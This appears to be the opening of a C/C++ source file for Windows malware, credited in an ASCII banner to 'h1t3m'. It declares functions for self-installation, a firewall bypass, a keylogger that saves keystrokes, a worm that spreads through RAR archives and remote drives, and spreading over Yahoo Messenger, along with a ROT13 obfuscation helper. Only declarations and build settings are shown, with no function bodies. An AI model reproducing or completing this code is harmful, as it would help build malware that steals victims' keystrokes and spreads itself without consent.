   /*\______________             ____                      ___________________
  /                /|  ,-,______/    \______/\________    /                   \
 /By: h1t3m       / | /_____   /      \   __  \       \  /                    /
/_____      _____/  | ___  /  /  /\    \ (__) /    ,\  \/                    /
     /     / \      |/ _ \/  /  (__)   /  __  \__  | \    /\                /
     \     \  \_______/ \____\________/   | \____\_|  \__/  \root@h1t3m.org/
	  \_____\                        |____|                  \___________*/

#define _WIN32_WINNT	0x0403
#define WIN32_LEAN_AND_MEAN
#pragma optimize("gsy", on)
#pragma comment(linker, "/opt:nowin98")
#pragma comment(linker, "/ALIGN:4096")
#pragma comment(linker, "/IGNORE:4108 ")
#pragma comment(linker, "/subsystem:windows")
#include <windows.h>
#include <stdio.h>
#include <urlmon.h>
#include <winsock.h>
#include <shlwapi.h>
#include <iostream>
#include <tlhelp32.h>
#include <shellapi.h>
#include <commctrl.h>
#pragma comment(lib, "shlwapi")
#pragma comment(lib, "Urlmon")
void Install();
void BypassFirewall(char lfile[MAX_PATH]);
char *r13(char hooch[256]);
void FindRemoteDrive();
typedef struct KEYS
{
	int inputL;
	char outputL[7];
	char outputH[7];
} KEYS;
typedef struct SYTES
{
	char title[128];
} SYTES;
int SaveKeys(char *key);
DWORD WINAPI KeyLogger(LPVOID param);
extern char t_panel[];
DWORD WINAPI RarWorm(LPVOID xvoid);
char *GenerateRandomLetters(unsigned int len);
int YahSend();
extern char yim_link[];